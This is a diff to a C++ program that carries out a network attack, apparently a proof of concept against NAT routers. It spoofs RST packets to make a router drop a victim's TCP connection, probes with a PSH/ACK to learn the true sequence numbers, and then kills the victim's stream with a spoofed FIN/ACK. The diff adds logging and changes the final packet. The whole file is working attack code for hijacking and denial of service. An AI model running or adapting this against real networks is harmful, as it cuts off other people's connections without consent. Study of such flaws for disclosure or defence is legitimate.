@@ -34,12 +34,15 @@ int main(int argc, char **argv) {
 
   // Get a random number for the initial sequence numbers on the server side.
   // Remember to seed with a real random number generator.
-  std::default_random_engine isn_engine{std::random_device{}()};
-  std::uniform_int_distribution<uint32_t> isn_dist{
+  std::random_device rd;
+  std::default_random_engine isn_engine{rd()};
+  std::uniform_int_distribution<uint32_t> isn_dist{ 
       0, std::numeric_limits<uint32_t>::max() / 2};
   uint32_t server_isn = isn_dist(isn_engine);
   uint32_t attacker_isn = isn_dist(isn_engine);
   uint32_t garbage_ack = isn_dist(isn_engine);
+
+  std::cout << "Sending RST to router to evict connection." << std::endl;
 
   // Spoof RST packets to the router from the server
   send_pkt(config, TCPPacket{
@@ -60,16 +63,18 @@ int main(int argc, char **argv) {
                        .rst = true,
                    });
 
+  std::cout << "Sleeping until connection evicted." << std::endl;
+
   // Wait for the NAT to evict the victim's connection
   std::this_thread::sleep_for(config.router_timeout);
 
+  std::cout << "Getting true seqno and ackno with garbage PSH/ACK." << std::endl;
   // Reset the mapping with PSH/ACK, arbitrary seqno
   send_pkt(config, TCPPacket{
                        .src = attacker_addr,
                        .dst = config.topology.server_addr,
-                       .ttl = config.topology.server_ttl_drop,
                        .seqno = attacker_isn,
-                       .ackno = std::nullopt,
+                       .ackno = garbage_ack,
                        .psh = true,
                    });
 
@@ -82,18 +87,20 @@ int main(int argc, char **argv) {
       config.timeout);
   
   if (!response.has_value()) {
-    std::cout << "Error in evicting connection." << std::endl;
+    std::cout << "Error in evicting connection: no response to PSH/ACK." << std::endl;
   } else {
     uint32_t true_seqno = response->seqno;
     uint32_t true_ackno = response->ackno.value();
+    std::cout << "Got seqno: " << true_seqno << ", ackno: " << true_ackno << std::endl;
 
+    std::cout << "DDOSing with FIN/ACK" << std::endl;
     // DDOS stream by sending RST with correct seqno
     send_pkt(config, TCPPacket{
                       .src = attacker_addr,
                       .dst = config.topology.server_addr,
-                      .seqno = true_ackno + 1,
-                      .ackno = true_seqno + 1,
-                      .rst = true,
+                      .seqno = true_ackno,
+                      .ackno = true_seqno,
+                      .fin = true,
                   });
   }
 }
